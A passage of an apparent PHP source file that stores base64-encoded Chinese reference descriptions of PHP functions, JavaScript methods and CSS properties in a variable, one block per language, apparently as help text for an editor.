wgveLO9sb3oaNwaHA0fHhtbF9wYXJzZXJfY3JlYXRlKCm0tL2oIFhNTCC94s72xveho3BocDN8eG1sX3BhcnNlcl9mcmVlKCnKzbfFIFhNTCC94s72xveho3BocDN8eG1sX3BhcnNlcl9nZXRfb3B0aW9uKCm00yBYTUwgveLO9sb3u/HIodGhz+7J6NbD0MXPoqGjcGhwM3x4bWxfcGFyc2VyX3NldF9vcHRpb24oKc6qIFhNTCC94s72vfjQ0NGhz+7J6NbDoaNwaHAzfHhtbF9zZXRfY2hhcmFjdGVyX2RhdGFfaGFuZGxlcigpvajBotfWt/vK/b7dtKbA7cb3oaNwaHAzfHhtbF9zZXRfZGVmYXVsdF9oYW5kbGVyKCm9qMGixKzIz7XEyv2+3bSmwO3G96GjcGhwM3x4bWxfc2V0X2VsZW1lbnRfaGFuZGxlcigpvajBosbwyry6zdbV1rnUqsvYtKbA7cb3oaNwaHAzfHhtbF9zZXRfZW5kX25hbWVzcGFjZV9kZWNsX2hhbmRsZXIoKb2owaLW1da5w/zD+7/VvOTJ+cP3tKbA7cb3oaNwaHA0fHhtbF9zZXRfZXh0ZXJuYWxfZW50aXR5X3JlZl9oYW5kbGVyKCm9qMGizeKyv8q1zOW0psDtxveho3BocDN8eG1sX3NldF9ub3RhdGlvbl9kZWNsX2hhbmRsZXIoKb2owaLXosrNyfnD97SmwO3G96GjcGhwM3x4bWxfc2V0X29iamVjdCgp1Nq21M/z1tDKudPDIFhNTCC94s72xveho3BocDR8eG1sX3NldF9wcm9jZXNzaW5nX2luc3RydWN0aW9uX2hhbmRsZXIoKb2owaK0psDt1rjB7qOoUEmjqbSmwO3G96GjcGhwM3x4bWxfc2V0X3N0YXJ0X25hbWVzcGFjZV9kZWNsX2hhbmRsZXIoKb2owaLG8Mq8w/zD+7/VvOTJ+cP3tKbA7cb3oaNwaHA0fHhtbF9zZXRfdW5wYXJzZWRfZW50aXR5X2RlY2xfaGFuZGxlcigpvajBos60veLO9sq1zOW2qNLlyfnD97SmwO3G96GjcGhwM3x6aXBfY2xvc2UoKbnYsdUgWklQIM7EvP6ho3BocDR8emlwX2VudHJ5X2Nsb3NlKCm52LHVIFpJUCDOxLz+1tC1xNK7uPbP7sS/oaNwaHA0fHppcF9lbnRyeV9jb21wcmVzc2Vkc2l6ZSgpt7W72CBaSVAgzsS8/tbQtcTSu7j2z+7Ev7XEsbvRucv1s9+056GjcGhwNHx6aXBfZW50cnlfY29tcHJlc3Npb25tZXRob2QoKbe1u9ggWklQIM7EvP7W0LXE0ru49s/uxL+1xNG5y/W3vbeooaNwaHA0fHppcF9lbnRyeV9maWxlc2l6ZSgpt7W72CBaSVAgzsS8/tbQtcTSu7j2z+7Ev7XEyrW8ys7EvP6z37TnoaNwaHA0fHppcF9lbnRyeV9uYW1lKCm3tbvYIFpJUCDOxLz+1tC1xNK7uPbP7sS/tcTD+7PGoaNwaHA0fHppcF9lbnRyeV9vcGVuKCm08r+qIFpJUCDOxLz+1tC1xNK7uPbP7sS/0tS5qbbByKGho3BocDR8emlwX2VudHJ5X3JlYWQoKbbByKEgWklQIM7EvP7W0LXE0ru49rTyv6q1xM/uxL+ho3BocDR8emlwX29wZW4oKbTyv6ogWklQIM7EvP6ho3BocDR8emlwX3JlYWQoKbbByKEgWklQIM7EvP7W0LXEz8LSu7j2z+7Ev6GjcGhwNHxjb25uZWN0aW9uX2Fib3J0ZWQoKbzssunKx7fxts+/qr/Nu6e7+qGjcGhwM3xjb25uZWN0aW9uX3N0YXR1cygpt7W72LWxx7C1xMGsvdPXtMysoaNwaHAzfGNvbm5lY3Rpb25fdGltZW91dCgp1NogUEhQcGhwNS4wLjUg1tCyu9Tes8nKudPDoaNwaHAzfGNvbnN0YW50KCm3tbvY0ru49rOjwb+1xNa1oaNwaHA0fGRlZmluZSgptqjS5dK7uPazo8G/oaNwaHAzfGRlZmluZWQoKbzssunEs7Ojwb/Kx7fxtObU2qGjcGhwM3xkaWUoKcrks/bSu8z1z/vPoqOssqLNy7P2tbHHsL3Fsb6ho3BocDN8ZXZhbCgpsNHX1rf7tK6wtNXVIFBIUCC0+sLrwLS8xsvjoaNwaHAzfGV4aXQoKcrks/bSu8z1z/vPoqOssqLNy7P2tbHHsL3Fsb6ho3BocDN8Z2V0X2Jyb3dzZXIoKbe1u9jTw7un5K/AwMb3tcTQ1MTcoaNwaHAzfGhpZ2hsaWdodF9maWxlKCm21M7EvP69+NDQ0++3qLjfwcHP1Mq+oaNwaHA0fGhpZ2hsaWdodF9zdHJpbmcoKbbU19a3+7SuvfjQ0NPvt6i438HBz9TKvqGjcGhwNHxpZ25vcmVfdXNlcl9hYm9ydCgpyejWw9Prv827p7v6ts+/qsrHt/G74dbV1rm9xbG+tcTWtNDQoaNwaHAzfHBhY2soKbDRyv2+3dewyOvSu7j2tv69+NbG19a3+7SuoaNwaHAzfHBocF9jaGVja19zeW50YXgoKdTaIFBIUHBocDUuMC41INbQsrvU3rPJyrnTw6GjcGhwNXxwaHBfc3RyaXBfd2hpdGVzcGFjZSgpt7W72NLRyb6z/SBQSFAg16LKzdLUvLC/1bDX19a3+7XE1LS0+sLrzsS8/qGjcGhwNXxzaG93X3NvdXJjZSgpaGlnaGxpZ2h0X2ZpbGUoKSC1xLHww/uho3BocDR8c2xlZXAoKdHTs9m0+sLr1rTQ0Mj0uMnD66GjcGhwM3x0aW1lX25hbm9zbGVlcCgp0dOz2bT6wuvWtNDQyPS4ycPrus3EycProaNwaHA1fHRpbWVfc2xlZXBfdW50aWwoKdHTs9m0+sLr1rTQ0Na4tqi1xMqxvOSho3BocDV8dW5pcWlkKCnJ+rPJzqjSu7XEIElEoaNwaHAzfHVucGFjaygptNO2/r341sbX1rf7tK621Mr9vt29+NDQveKw/KGjcGhwM3x1c2xlZXAoKdHTs9m0+sLr1rTQ0Mj0uMnOosProaNwaHAzfA==";
}else if($hscx==2){
$hs="YWJzILe9t6ggt7W72NK7uPbK/bXEvvi21Na1oaMgfGFjb3Mgt723qCC3tbvY0ru49sr9tcS3tNPgz9KhoyB8YW5jaG9yILe9t6gg1Nq21M/ztcTWuLaozsSxvsG9tsu808nP0ru49rT4IE5BTUUgyvTQ1LXEIEhUTUwgw6q146GjIHxhc2luILe9t6ggt7W72NK7uPbK/bXEt7TV/c/SoaMgfGF0YW4gt723qCC3tbvY0ru49sr9tcS3tNX9x9ChoyB8YXRhbjIgt723qCC3tbvYtNMgWCDW4bW9teMgo6h5LCB4o6m1xL3HtsijqNLUu6G2yM6qtaXOu6OpoaMgfGF0RW5kILe9t6ggt7W72NK7uPax7cP3w7a+2cvj19PKx7fxtKbT2ryvus+94cr4tKa1xCBCb29sZWFuINa1oaMgfGJpZyC3vbeoINTaU3RyaW5nILbUz/O1xM7Esb7BvbbLvNPI6yBIVE1MILXEPEJJRz6x6sq2oaMgfGJsaW5rILe9t6ggvasgSFRNTCC1xCA8QkxJTks+ILHqyrbM7bzTtb0gU3RyaW5nILbUz/PW0LXEzsSxvsG9tsuhoyB8Ym9sZCC3vbeoIL2rIEhUTUwgtcQgPEI+ILHqyrbM7bzTtb1TdHJpbmcgttTP89bQtcTOxLG+wb22y6GjIHxjZWlsILe9t6ggt7W72LTz09q78rXI09rG5Mr91rWyzsr9tcTX7tCh1fvK/aGjIHxjaGFyQXQgt723qCC3tbvYzrvT2ta4tqjL99L9zrvWw7XE19a3+6GjIHxjaGFyQ29kZUF0ILe9t6ggt7W72Na4tqjX1rf7tcQgVW5pY29kZSCx4MLroaMgfGNvbXBpbGUgt723qCC9q9K7uPbV/dTyse2078q9seDS686qxNqyv7jxyr2hoyB8Y29uY2F0ILe9t6ijqEFycmF5o6kgt7W72NK7uPbTycG9uPbK/dfpus+yotfps8m1xNDCyv3X6aGjIHxjb25jYXQgt723qKOoU3RyaW5no6kgt7W72NK7uPaw/LqsuPi2qLXEwb249tfWt/u0rrXEway907XEIFN0cmluZyC21M/zoaMgfGNvcyC3vbeoILe1u9jSu7j2yv21xNPgz9KhoyB8ZGltZW5zaW9ucyC3vbeoILe1u9ggVkJBcnJheSC1xM6syv2hoyB8ZXNjYXBlILe9t6ggttQgU3RyaW5nILbUz/Ox4MLro6zS1LHj1NrL+dPQvMbL47v6yc+2vMTc1MS2waGjIHxldmFsILe9t6ggttQgSlNjcmlwdCC0+sLrx/PWtci7uvPWtNDQ1q6hoyB8ZXhlYyC3vbeoINTa1ri2qNfWt/u0rtbQ1rTQ0NK7uPbGpcXksunV0qGjIHxleHAgt723qCC3tbvYIGUgo6jX1Mi7ttTK/bXEtdejqSC1xMPdoaMgfGZpeGVkILe9t6ggvasgSFRNTCC1xDxUVD4gserKtsztvNO1vVN0cmluZyC21M/z1tC1xM7Esb7BvbbLoaMgfGZsb29yILe9t6ggt7W72NCh09q78rXI09rG5Mr91rWyzsr9tcTX7rTz1fvK/aGjIHxmb250Y29sb3Igt723qCC9qyBIVE1MILT4IENPTE9SIMr00NS1xDxGT05UPrHqyrbM7bzTtb0gU3RyaW5nILbUz/PW0LXEzsSxvsG9tsuhoyB8Zm9udHNpemUgt723qCC9qyBIVE1MILT4IFNJWkUgyvTQ1LXEPEZPTlQ+serKtsztvNO1vSBTdHJpbmcgttTP89bQtcTOxLG+wb22y6GjIHxmcm9tQ2hhckNvZGUgt723qCC3tbvYIFVuaWNvZGUg19a3+9a1tcTX1rf7tK6hoyB8Z2V0RGF0ZSC3vbeoIMq508O1sbXYyrG85Le1u9ggRGF0ZSC21M/ztcTUwrfdyNXG2ta1oaMgfGdldERheSC3vbeoIMq508O1sbXYyrG85Le1u9ggRGF0ZSC21M/ztcTQx8bavLihoyB8Z2V0RnVsbFllYXIgt723qCDKudPDtbG12MqxvOS3tbvYIERhdGUgttTP87XExOq33aGjIHxnZXRIb3VycyC3vbeoIMq508O1sbXYyrG85Le1u9ggRGF0ZSC21M/ztcTQocqx1rWhoyB8Z2V0SXRlbSC3vbeoILe1u9jOu9Pa1ri2qM671sO1xM/uoaMgfGdldE1pbGxpc2Vjb25kcyC3vbeoIMq508O1sbXYyrG85Le1u9ggRGF0ZSC21M/ztcS6wcPr1rWhoyB8Z2V0TWludXRlcyC3vbeoIMq508O1sbXYyrG85Le1u9ggRGF0ZSC21M/ztcS31tbT1rWhoyB8Z2V0TW9udGggt723qCDKudPDtbG12MqxvOS3tbvYIERhdGUgttTP87XE1MK33aGjIHxnZXRTZWNvbmRzILe9t6ggyrnTw7WxtdjKsbzkt7W72CBEYXRlILbUz/O1xMPryv2hoyB8Z2V0VGltZSC3vbeoILe1u9ggRGF0ZSC21M/z1tC1xMqxvOShoyB8Z2V0VGltZXpvbmVPZmZzZXQgt723qCC3tbvY1ve7+rXEyrG85LrNyKvH8rHq17zKsbzko6hVVEOjqdauvOS1xLLuo6jS1LfW1tPOqrWlzrujqaGjIHxnZXRVVENEYXRlILe9t6ggyrnTw8irx/Kx6te8yrG85KOoVVRDo6m3tbvYIERhdGUgttTP87XEyNXG2ta1oaMgfGdldFVUQ0RheSC3vbeoIMq508PIq8fyserXvMqxvOSjqFVUQ6Opt7W72CBEYXRlILbUz/O1xNDHxtq8uKGjIHxnZXRVVENGdWxsWWVhciC3vbeoIMq508PIq8fyserXvMqxvOSjqFVUQ6Opt7W72CBEYXRlILbUz/O1xMTqt92hoyB8Z2V0VVRDSG91cnMgt723qCDKudPDyKvH8rHq17zKsbzko6hVVEOjqbe1u9hEYXRlILbUz/O1xNChyrHK/aGjIHxnZXRVVENNaWxsaXNlY29uZHMgt723qCDKudPDyKvH8rHq17zKsbzko6hVVEOjqbe1u9hEYXRlILbUz/O1xLrBw+vK/aGjIHxnZXRVVENNaW51dGVzILe9t6ggyrnTw8irx/Kx6te8yrG85KOoVVRDo6m3tbvYIERhdGUgttTP87XEt9bW08r9oaMgfGdldFVUQ01vbnRoILe9t6ggyrnTw8irx/Kx6te8yrG85KOoVVRDo6m3tbvYIERhdGUgttTP87XE1MK33da1oaMgfGdldFVUQ1NlY29uZHMgt723qCDKudPDyKvH8rHq17zKsbzko6hVVEOjqbe1u9hEYXRlttTP87XEw+vK/aGjIHxnZXRWYXJEYXRlILe9t6ggt7W72CBEYXRlILbUz/PW0LXEIFZUX0RBVEWhoyB8Z2V0WWVhciC3vbeoILe1u9ggRGF0ZSC21M/z1tC1xMTqt92hoyB8aW5kZXhPZiC3vbeoILe1u9jU2iBTdHJpbmcgttTP89bQtdrSu7TOs/bP1tfT19a3+7SutcTX1rf7zrvWw6GjIHxpc0Zpbml0ZSC3vbeoILe1u9jSu7j2IEJvb2xlYW4g1rWjrLHtw/fEs7j2uPi2qLXEyv3Kx7fxysfT0MfutcShoyB8aXNOYU4gt723qCC3tbvY0ru49iBCb29sZWFuINa1o6yx7cP3xLO49ta1yse38c6qsaPB9Na1IE5hTiCjqLK7ysfSu7j2yv2jqaGjIHxpdGFsaWNzILe9t6ggvasgSFRNTLXEIDxJPiCx6sq2zO2807W9IFN0cmluZyC21M/z1tC1xM7Esb7BvbbLoaMgfGl0ZW0gt723qCC3tbvYvK+6z9bQtcS1scewz+6hoyB8am9pbiC3vbeoILe1u9jSu7j208nK/dfp1tC1xMv509DUqsvYway909Ta0rvG8LXEIFN0cmluZyC21M/zoaMgfGxhc3RJbmRleE9mILe9t6ggt7W72NTaIFN0cmluZyC21M/z1tDX09fWt/u0rtfuuvOz9s/WtcTOu9bDoaMgfGxib3VuZCC3vbeoILe1u9jU2iBWQkFycmF5INbQ1ri2qM6syv3L+dPDtcTX7tChy/fS/da1oaMgfGxpbmsgt723qCC9q7T4IEhSRUYgyvTQ1LXEIEhUTUwgw6q148ztvNO1vSBTdHJpbmcgttTP89bQtcTOxLG+wb22y6GjIHxsb2cgt723qCC3tbvYxLO49sr9tcTX1Mi7ttTK/aGjIHxtYXRjaCC3vbeoIMq508O4+LaotcTV/dTyse2078q9ttTP87bU19a3+7SuvfjQ0LLp1dKjrLKivau94bn71/fOqsr91+m3tbvYoaMgfG1heCC3vbeoILe1u9i4+LaotcTBvbj2se2078q91tC1xL3PtPPV36GjIHxtaW4gt723qCC3tbvYuPi2qLXEwb249sr91tC1xL3P0KHV36GjIHxtb3ZlRmlyc3Qgt723qCC9q7yvus/W0LXEtbHHsM/uyejWw86qtdrSu8/uoaMgfG1vdmVOZXh0ILe9t6ggvau1scewz+7J6NbDzqq8r7rP1tC1xM/C0rvP7qGjIHxwYXJzZSC3vbeoILbUsPy6rMjVxtq1xNfWt/u0rr340NC31s72o6yyore1u9i4w8jVxtrT6zE5NzDE6jHUwjHI1cHjtePWrrzkz+Cy7rXEusHD68r9oaMgfHBhcnNlRmxvYXQgt723qCC3tbvYtNPX1rf7tK7Xqru7tvjAtLXEuKG148r9oaMgfHBhcnNlSW50ILe9t6ggt7W72LTT19a3+7Su16q7u7b4wLS1xNX7yv2hoyB8cG93ILe9t6ggt7W72NK7uPbWuLaow920zrXEtdex7bTvyr21xNa1oaMgfHJhbmRvbSC3vbeoILe1u9jSu7j2IDAgus0gMSDWrrzktcTOscvmu/rK/aGjIHxyZXBsYWNlILe9t6ggt7W72Lj5vt3V/dTyse2078q9vfjQ0M7E19bM5ru7uvO1xNfWt/u0rrXEv72xtKGjIHxyZXZlcnNlILe9t6ggt7W72NK7uPbUqsvYt7TQ8rXEIEFycmF5ILbUz/OhoyB8cm91bmQgt723qCC9q9K7uPbWuLaotcTK/da1se2078q9yeHI67W91+69/LXE1fvK/bKivavG5Le1u9ihoyB8c2VhcmNoILe9t6ggt7W72NPr1f3U8rHttO/KvbLp1dLE2sjdxqXF5LXEtdrSu7j219PX1rf7tK61xM671sOhoyB8c2V0RGF0ZSC3vbeoIMq508O1sbXYyrG85Mno1sMgRGF0ZSC21M/ztcTK/da1yNXG2qGjIHxzZXRGdWxsWWVhciC3vbeoIMq508O1sbXYyrG85Mno1sMgRGF0ZSC21M/ztcTE6rfdoaMgfHNldEhvdXJzILe9t6ggyrnTw7WxtdjKsbzkyejWwyBEYXRlILbUz/O1xNChyrHWtaGjIHxzZXRNaWxsaXNlY29uZHMgt723qCDKudPDtbG12MqxvOTJ6NbDIERhdGUgttTP87XEusHD69a1oaMgfHNldE1pbnV0ZXMgt723qCDKudPDtbG12MqxvOTJ6NbDIERhdGUgttTP87XEt9bW09a1oaMgfHNldE1vbnRoILe9t6ggyrnTw7WxtdjKsbzkyejWwyBEYXRlILbUz/O1xNTCt92hoyB8c2V0U2Vjb25kcyC3vbeoIMq508O1sbXYyrG85Mno1sMgRGF0ZSC21M/ztcTD69a1oaMgfHNldFRpbWUgt723qCDJ6NbDIERhdGUgttTP87XEyNXG2rrNyrG85KGjIHxzZXRVVENEYXRlILe9t6ggyrnTw8irx/Kx6te8yrG85KOoVVRDo6nJ6NbDIERhdGUgttTP87XEyv3WtcjVxtqhoyB8c2V0VVRDRnVsbFllYXIgt723qCDKudPDyKvH8rHq17zKsbzko6hVVEOjqcno1sMgRGF0ZSC21M/ztcTE6rfdoaMgfHNldFVUQ0hvdXJzILe9t6ggyrnTw8irx/Kx6te8yrG85KOoVVRDo6nJ6NbDIERhdGUgttTP87XE0KHKsda1oaMgfHNldFVUQ01pbGxpc2Vjb25kcyC3vbeoIMq508PIq8fyserXvMqxvOSjqFVUQ6OpyejWwyBEYXRlILbUz/O1xLrBw+vWtaGjIHxzZXRVVENNaW51dGVzILe9t6ggyrnTw8irx/Kx6te8yrG85KOoVVRDo6nJ6NbDIERhdGUgttTP87XEt9bW09a1oaMgfHNldFVUQ01vbnRoILe9t6ggyrnTw8irx/Kx6te8yrG85KOoVVRDo6nJ6NbDIERhdGUgttTP87XE1MK33aGjIHxzZXRVVENTZWNvbmRzILe9t6ggyrnTw8irx/Kx6te8yrG85KOoVVRDo6nJ6NbDIERhdGUgttTP87XEw+vWtaGjIHxzZXRZZWFyILe9t6ggyrnTwyBEYXRlILbUz/O1xMTqt92hoyB8c2luILe9t6ggt7W72NK7uPbK/bXE1f3P0qGjIHxzbGljZSC3vbeoIKOoQXJyYXmjqSC3tbvYyv3X6bXE0ru49sasts6hoyB8c2xpY2Ugt723qCCjqFN0cmluZ6OpILe1u9jX1rf7tK61xNK7uPbGrLbOoaMgfHNtYWxsILe9t6ggvasgSFRNTCC1xDxTTUFMTD4gserKtsztvNO1vSBTdHJpbmcgttTP89bQtcTOxLG+wb22y6GjIHxzb3J0ILe9t6ggt7W72NK7uPbUqsvYsbvFxdDywcu1xCBBcnJheSC21M/zoaMgfHNwbGl0ILe9t6ggvavSu7j219a3+7Sut9a47s6q19PX1rf7tK6jrMi7uvO9q73hufvX986q19a3+7Suyv3X6be1u9ihoyB8c3FydCC3vbeoILe1u9jSu7j2yv21xMa9t724+aGjIHxzdHJpa2Ugt723qCC9qyBIVE1MILXEPFNUUklLRT4gserKtsztvNO1vVN0cmluZyC21M/z1tC1xM7Esb7BvbbLoaMgfHN1YiC3vbeoIL2rIEhUTUwgtcQgPFNVQj4gserKtrfF1sO1vSBTdHJpbmcgttTP89bQtcTOxLG+wb22y6GjIHxzdWJzdHIgt723qCC3tbvY0ru49rTT1ri2qM671sO/qsq8sqK+39PQ1ri2qLOktsi1xNfT19a3+7SuoaMgfHN1YnN0cmluZyC3vbeoILe1u9jOu9PaIFN0cmluZyC21M/z1tDWuLaozrvWw7XE19PX1rf7tK6hoyB8c3VwILe9t6ggvasgSFRNTCC1xCA8U1VQPiCx6sq2t8XWw7W9IFN0cmluZyC21M/z1tC1xM7Esb7BvbbLoaMgfHRhbiC3vbeoILe1u9jSu7j2yv21xNX9x9ChoyB8dGVzdCC3vbeoILe1u9jSu7j2IEJvb2xlYW4g1rWjrLHtw/fU2rG7sunV0rXE19a3+7Su1tDKx7fxtObU2sSzuPbEo8q9oaMgfHRvQXJyYXkgt723qCC3tbvY0ru49rTTIFZCQXJyYXkg16q7u7b4wLS1xLHq17wgSlNjcmlwdCDK/dfpoaMgfHRvR01UU3RyaW5nILe9t6ggt7W72NK7uPbXqru7zqrKudPDuPHB1s3+1s6x6te8yrG85KOoR01Uo6m1xNfWt/u0rrXEyNXG2qGjIHx0b0xvY2FsZVN0cmluZyC3vbeoILe1u9jSu7j216q7u86qyrnTw7WxtdjKsbzktcTX1rf7tK61xMjVxtqhoyB8dG9Mb3dlckNhc2Ugt723qCC3tbvY0ru49sv509C1xNfWxLjX1rf7tryxu9equ7vOqtCh0LTX1sS4tcTX1rf7tK6hoyB8dG9TdHJpbmcgt723qCC3tbvY0ru49rbUz/O1xNfWt/u0rrHtyr6hoyB8dG9VcHBlckNhc2Ugt723qCC3tbvY0ru49sv509C1xNfWxLjX1rf7tryxu9equ7vOqrTz0LTX1sS4tcTX1rf7tK6hoyB8dG9VVENTdHJpbmcgt723qCC3tbvY0ru49tequ7vOqsq508PIq8fyserXvMqxvOSjqFVUQ6OptcTX1rf7tK61xMjVxtqhoyB8dWJvdW5kILe9t6ggt7W72NTaIFZCQXJyYXkgtcTWuLaozqzW0Mv5yrnTw7XE1+6088v30v3WtaGjIHx1bmVzY2FwZSC3vbeoILbU08Nlc2NhcGUgt723qLHgwuu1xCBTdHJpbmcgttTP87340NC94sLroaMgfFVUQyC3vbeoILe1u9ggMTk3MMTqMdTCMcjVweO147XEyKvH8rHq17zKsbzkIKOoVVRDo6kgo6i78iBHTVSjqdPr1ri2qMjVxtrWrrzktcS6wcPryv0uIHx2YWx1ZU9mILe9t6ggt7W72Na4tqi21M/ztcTUrcq81rWhoyB8JDEuLi4kOSDK9NDUILe1u9jU2sSjyr3GpcXk1tDV0rW9tcTX7r38tcS+xcz1vMfCvCB8YXJndW1lbnRzIMr00NQgt7W72NK7uPaw/LqstKu13bj4tbHHsNa00NC6r8r9tcTDv7j2ss7K/bXEyv3X6aGjIHxjYWxsZXIgyvTQ1CC3tbvYtffTw7Wxx7C6r8r9tcS6r8r90v3Tw6GjIHxjb25zdHJ1Y3RvciDK9NDUINa4tqi0tL2ottTP87XEuq/K/aGjIHxkZXNjcmlwdGlvbiDK9NDUILe1u9i78sno1sO52NPa1ri2qLTtzvO1xMPoyvbX1rf7tK6hoyB8RSDK9NDUILe1u9ggRXVsZXIgs6PK/aOsvLTX1Mi7ttTK/bXEtdehoyB8aW5kZXggyvTQ1CC3tbvY1NrX1rf7tK7W0NXStb21xLXa0ru49rPJuabGpcXktcTX1rf7zrvWw6GjIHxJbmZpbml0eSDK9NDUILe1u9ggTnVtYmVyLlBPU0lUSVZFX0lORklOSVRZILXEs/XKvNa1oaMgfGlucHV0IMr00NQgt7W72L340NCy6dXStcTX1rf7tK6hoyB8bGFzdEluZGV4IMr00NQgt7W72NTa19a3+7Su1tDV0rW9tcTX7rrz0ru49rPJuabGpcXktcTX1rf7zrvWw6GjIHxsZW5ndGggyvTQ1KOoQXJyYXmjqSC3tbvYscjK/dfp1tDL+bao0uW1xNfuuN/UqsvYtPMgMSC1xNK7uPbV+8r9oaMgfGxlbmd0aCDK9NDUo6hGdW5jdGlvbqOpILe1u9jOqrqvyv3L+bao0uW1xLLOyv249sr9oaMgfGxlbmd0aCDK9NDUo6hTdHJpbmejqSC3tbvYIFN0cmluZyC21M/ztcSzpLbIoaMgfExOMiDK9NDUILe1u9ggMiC1xNfUyLu21Mr9oaMgfExOMTAgyvTQ1CC3tbvYIDEwILXE19TIu7bUyv2hoyB8TE9HMkUgyvTQ1CC3tbvY0tQgMiDOqrXXtcQgZaOovLQgRXVsZXKzo8r9o6m1xLbUyv2hoyB8TE9HMTBFIMr00NQgt7W72NLUIDEwIM6qtde1xGWjqLy0IEV1bGVys6PK/aOptcS21Mr9oaMgfE1BWF9WQUxVRSDK9NDUILe1u9jU2iBKU2NyaXB01tDE3LHtyr61xNfutPPWtaGjIHxNSU5fVkFMVUUgyvTQ1CC3tbvY1NogSlNjcmlwdNbQxNyx7cq+tcTX7r3TvfzB47XE1rWhoyB8TmFOIMr00NSjqEdsb2JhbKOpILe1u9jM2Mri1rUgTmFOo6yx7cq+xLO49rHttO/KvbK7ysfSu7j2yv2hoyB8TmFOIMr00NQgo6hOdW1iZXKjqSC3tbvYzNjK4ta1IKOoTmFOo6mjrLHtyr7Es7j2se2078q9srvKx9K7uPbK/aGjIHxORUdBVElWRV9JTkZJTklUWSDK9NDUILe1u9ixyNTaIEpTY3JpcHQg1tDE3LHtyr61xNfutPO1xLi6yv0go6gtTnVtYmVyLk1BWF9WQUxVRaOpuPy4urXE1rWhoyB8bnVtYmVyIMr00NQgt7W72LvyyejWw9PrzNi2qLTtzvO52MGqtcTK/da1oaMgfFBJIMr00NQgt7W72NSy1tzT68bk1rG+trXEscjWtaOs1Ly1yNPaMy4xNDE1OTI2NTM1ODk3OTOhoyB8UE9TSVRJVkVfSU5GSU5JVFkgyvTQ1CC3tbvYscjU2iBKU2NyaXB0INbQxNyx7cq+tcTX7rTztcTK/SCjqE51bWJlci5NQVhfVkFMVUWjqbj8tPO1xNa1oaMgfHByb3RvdHlwZSDK9NDUILe1u9i21M/zwOC1xNSt0M3S/dPDoaMgfHNvdXJjZSDK9NDUILe1u9jV/dTyse2078q9xKPKvbXEzsSxvrXEv72xtKGjIHxTUVJUMV8yIMr00NQgt7W72CAwLjUgtcTGvbe9uPmjrLy0IDEgs/3S1CAyILXExr23vbj5oaMgfFNRUlQyIMr00NQgt7W72CAyILXExr23vbj5IHwgfGJyZWFrINPvvuQg1tXWubWxx7DRrbu3o6y78tXfyOe5+9Pr0ru49mxhYmVsINPvvuS52MGqo6zU8tbV1rnP4LnYwaq1xNPvvuShoyB8Y2F0Y2gg0+++5CCw/Lqs1NogdHJ5INPvvuS/6dbQtcS0+sLrt6LJ+rTtzvPKsda00NC1xNPvvuShoyB8QGNjX29uINPvvuQgvKS77sz1vP6x4NLr1qez1qGjIHwvL6OotaXQ0Neiys3T777ko6kgyrm1pdDQ16LKzbG7IEpTY3JpcHQg0++3qLfWzvbG97r2wtShoyB8LyouLiovo6i24NDQ16LKzdPvvuSjqSDKubbg0NDXosrNsbsgSlNjcmlwdCDT77eot9bO9sb3uvbC1KGjIHxjb250aW51ZSDT777kIM2j1rnRrbu3tcS1scewtfy0+qOssqK/qsq80ru0ztDCtcS1/LT6oaMgfGRvLi4ud2hpbGUg0+++5CDPyNa00NDSu7TO0+++5L/po6zIu7rz1ti4tNa00NC4w9Gtu7ejrNax1sHM9bz+se2078q9tcTWtc6qIGZhbHNloaMgfGZvciDT777kINa70qrWuLaotcTM9bz+zqogdHJ1ZaOsvs3Su9ax1rTQ0NPvvuS/6aGjIHxmb3IuLi5pbiDT777kILbU06bT2rbUz/O78sr91+nW0LXEw7+49tSqy9jWtNDQ0ru49rvytuC49tPvvuShoyB8ZnVuY3Rpb24g0+++5CDJ+cP30ru49tDCtcS6r8r9oaMgfEBpZiDT777kILj5vt2x7bTvyr21xNa1o6zT0Mz1vP612Na00NDSu9fp0+++5KGjIHxpZi4uLmVsc2Ug0+++5CC4+b7dse2078q9tcTWtaOs09DM9bz+tdjWtNDQ0rvX6dPvvuShoyB8TGFiZWxlZCDT777kILj40+++5MzhuanSu7j2serKtrf7oaMgfHJldHVybiDT777kILTTtbHHsLqvyv3Ny7P2sqK007jDuq/K/be1u9jSu7j21rWhoyB8QHNldCDT777kILS0vajTw9PazPW8/rHg0uvT777ktcSx5MG/oaMgfHN3aXRjaCDT777kILWx1ri2qLXEse2078q9tcTWtdPrxLO49rHqx6nGpcXkyrGjrLy01rTQ0M/g06a1xNK7uPa78rbguPbT777koaMgfHRoaXMg0+++5CC21LWxx7C21M/ztcTS/dPDoaMgfHRocm93INPvvuQgsvrJ+tK7uPa/ydPJIHRyeS4uLmNhdGNoINPvvuS0psDttcS07c7zzPW8/qGjIHx0cnkg0+++5CDKtc/WIEpTY3JpcHQgtcS07c7ztKbA7aGjIHx2YXIg0+++5CDJ+cP30ru49rHkwb+hoyB8d2hpbGUg0+++5CDWtNDQ0+++5Nax1sG4+LaotcTM9bz+zqogZmFsc2WhoyB8d2l0aCDT777kIMi3tqjSu7j20+++5LXExKzIz7bUz/Ohow==";
}else if($hscx==3){
$hs="YmFja2dyb3VuZNTa0ru49sn5w/fW0Mno1sPL+dPQtcSxs76wyvTQ1KGjQ1NTMXxiYWNrZ3JvdW5kLWF0dGFjaG1lbnTJ6NbDsbO+sM28z/HKx7fxucy2qLvy1d/L5tfF0rPD5rXExuTT4LK/t9a59ravoaNDU1MxfGJhY2tncm91bmQtY29sb3LJ6NbD1KrL2LXEsbO+sNHVyauho0NTUzF8YmFja2dyb3VuZC1pbWFnZcno1sPUqsvYtcSxs76wzbzP8aGjQ1NTMXxiYWNrZ3JvdW5kLXBvc2l0aW9uyejWw7GzvrDNvM/xtcS/qsq8zrvWw6GjQ1NTMXxiYWNrZ3JvdW5kLXJlcGVhdMno1sPKx7fxvLDI57rO1ti4tLGzvrDNvM/xoaNDU1MxfGJvcmRlctTa0ru49sn5w/fW0Mno1sPL+dPQtcSx37/yyvTQ1KGjQ1NTMXxib3JkZXItYm90dG9t1NrSu7j2yfnD99bQyejWw8v509C1xM/Csd+/8sr00NSho0NTUzF8Ym9yZGVyLWJvdHRvbS1jb2xvcsno1sPPwrHfv/K1xNHVyauho0NTUzJ8Ym9yZGVyLWJvdHRvbS1zdHlsZcno1sPPwrHfv/K1xNH5yr2ho0NTUzJ8Ym9yZGVyLWJvdHRvbS13aWR0aMno1sPPwrHfv/K1xL/ttsiho0NTUzF8Ym9yZGVyLWNvbG9yyejWw8vEzPWx37/ytcTR1cmroaNDU1MxfGJvcmRlci1sZWZ01NrSu7j2yfnD99bQyejWw8v509C1xNfzsd+/8sr00NSho0NTUzF8Ym9yZGVyLWxlZnQtY29sb3LJ6NbD1/Ox37/ytcTR1cmroaNDU1MyfGJvcmRlci1sZWZ0LXN0e